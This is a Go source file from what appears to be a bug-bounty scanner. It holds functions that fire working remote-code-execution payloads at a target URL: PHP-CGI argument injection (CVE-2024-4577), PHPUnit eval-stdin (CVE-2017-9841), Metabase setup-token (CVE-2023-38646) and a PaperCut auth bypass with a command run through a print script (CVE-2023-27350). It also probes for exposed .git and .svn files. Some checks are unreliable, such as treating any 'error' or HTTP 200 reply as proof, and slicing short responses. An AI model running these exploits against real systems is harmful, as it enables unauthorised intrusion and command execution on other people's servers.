package bugbounty

import (
	"io"
	"net/http"
	"regexp"
	"strings"
)

// ============================================================
// .git / .svn source code leak
// ============================================================

var leakRegex = regexp.MustCompile(`(ref:\s*refs/|\[core\]|repositoryformatversion|\[svn\]|dir\s+svn:|^\d{4}-\d{2}-\d{2}T\d{2}:\d{2}:\d{2})`)

func ProbeGitLeak(base string) *Finding {
	paths := []string{
		"/.git/HEAD",
		"/.git/logs/HEAD",
		"/.git/config",
		"/.svn/entries",
		"/.svn/wc.db",
		"/.hg/store/00manifest.i",
	}
	for _, p := range paths {
		resp, err := client.Get(base + p)
		if err != nil {
			continue
		}
		body, _ := io.ReadAll(io.LimitReader(resp.Body, 2048))
		resp.Body.Close()
		s := string(body)
		if resp.StatusCode == 200 && leakRegex.MatchString(s) {
			detail := strings.TrimSpace(s)
			if len(detail) > 150 {
				detail = detail[:150]
			}
			return &Finding{
				Target:   base,
				Vuln:     ".git/.svn source code leak",
				Severity: "HIGH",
				Detail:   base + p + " -> " + detail,
				URL:      base + p,
			}
		}
	}
	return nil
}

// ============================================================
// CVE-2024-4577 PHP-CGI Argument Injection RCE
// ============================================================
func ProbeCVE20244577(base string) *Finding {
	payload := "/index.php?-d+allow_url_include%3dOn+-d+auto_prepend_file%3dphp%3a//input"
	body := "<?php echo shell_exec('id'); ?>"
	req, _ := http.NewRequest("POST", base+payload, strings.NewReader(body))
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	resp, err := client.Do(req)
	if err != nil {
		return nil
	}
	defer resp.Body.Close()
	r, _ := io.ReadAll(io.LimitReader(resp.Body, 2048))
	s := string(r)
	if strings.Contains(s, "uid=") {
		return &Finding{Target: base, Vuln: "CVE-2024-4577 PHP-CGI RCE", Severity: "CRITICAL",
			Detail: func() string {
				d := strings.TrimSpace(s)
				if len(d) > 200 {
					return d[:200]
				}
				return d
			}(), URL: base + payload}
	}
	return nil
}

// ============================================================
// CVE-2023-38646 Metabase RCE (pre-auth)
// ============================================================
func ProbeCVE202338646(base string) *Finding {
	// Step 1: get session
	resp, err := client.Get(base + "/api/session/properties")
	if err != nil {
		return nil
	}
	body, _ := io.ReadAll(io.LimitReader(resp.Body, 4096))
	resp.Body.Close()
	s := string(body)
	if !strings.Contains(s, "setup-token") && !strings.Contains(s, "metabase") {
		return nil
	}
	// Step 2: try setup token RCE
	payload := `{"token":"00000000-0000-0000-0000-000000000000","details":{"is_setup":true,"database":{"engine":"postgres","details":{"db":"x","host":"x","user":"x","password":"x","ssl":true,"ssl-options":{"sslmode":"require"}}}}}`
	req, _ := http.NewRequest("POST", base+"/api/setup/validate", strings.NewReader(payload))
	req.Header.Set("Content-Type", "application/json")
	resp2, err := client.Do(req)
	if err != nil {
		return nil
	}
	defer resp2.Body.Close()
	r, _ := io.ReadAll(io.LimitReader(resp2.Body, 2048))
	s2 := string(r)
	if strings.Contains(s2, "Metabase") || strings.Contains(s2, "error") {
		return &Finding{Target: base, Vuln: "CVE-2023-38646 Metabase pre-auth RCE", Severity: "CRITICAL",
			Detail: strings.TrimSpace(s2)[:200], URL: base + "/api/setup/validate"}
	}
	return nil
}

// ============================================================
// CVE-2017-9841 PHPUnit eval-stdin.php RCE
// ============================================================
func ProbeCVE20179841(base string) *Finding {
	paths := []string{
		"/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
		"/vendor/phpunit/phpunit/eval-stdin.php",
	}
	for _, p := range paths {
		req, _ := http.NewRequest("POST", base+p, strings.NewReader("echo shell_exec('id');"))
		resp, err := client.Do(req)
		if err != nil {
			continue
		}
		body, _ := io.ReadAll(io.LimitReader(resp.Body, 1024))
		resp.Body.Close()
		s := string(body)
		if strings.Contains(s, "uid=") {
			return &Finding{Target: base, Vuln: "CVE-2017-9841 PHPUnit RCE", Severity: "HIGH",
				Detail: func() string {
					d := strings.TrimSpace(s)
					if len(d) > 200 {
						return d[:200]
					}
					return d
				}(), URL: base + p}
		}
	}
	return nil
}

// ============================================================
// CVE-2023-27350 PaperCut Auth Bypass + RCE
// ============================================================
func ProbeCVE202327350(base string) *Finding {
	// Auth bypass
	req, _ := http.NewRequest("GET", base+"/app?client=apache&button=DetailsButton", nil)
	resp, err := client.Do(req)
	if err != nil {
		return nil
	}
	resp.Body.Close()
	if resp.StatusCode != 200 {
		return nil
	}
	// RCE via printer
	body := `xml=` + `<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"><soapenv:Body><ns1:runPrintScript xmlns:ns1="http://www.papercut.com/schema/2015/print/soap/services"><in0>&lt;xml&gt;&lt;Commands&gt;&lt;Command&gt;net.user&lt;/Command&gt;&lt;/Commands&gt;&lt;/xml&gt;</in0></ns1:runPrintScript></soapenv:Body></soapenv:Envelope>`
	req2, _ := http.NewRequest("POST", base+"/rpc/api", strings.NewReader(body))
	req2.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	resp2, err := client.Do(req2)
	if err != nil {
		return nil
	}
	defer resp2.Body.Close()
	r, _ := io.ReadAll(io.LimitReader(resp2.Body, 2048))
	s := string(r)
	if strings.Contains(s, "Domain") || strings.Contains(s, "Administrator") || resp2.StatusCode == 200 {
		return &Finding{Target: base, Vuln: "CVE-2023-27350 PaperCut RCE", Severity: "CRITICAL",
			Detail: func() string {
				d := strings.TrimSpace(s)
				if len(d) > 200 {
					return d[:200]
				}
				return d
			}(), URL: base + "/rpc/api"}
	}
	return nil
}
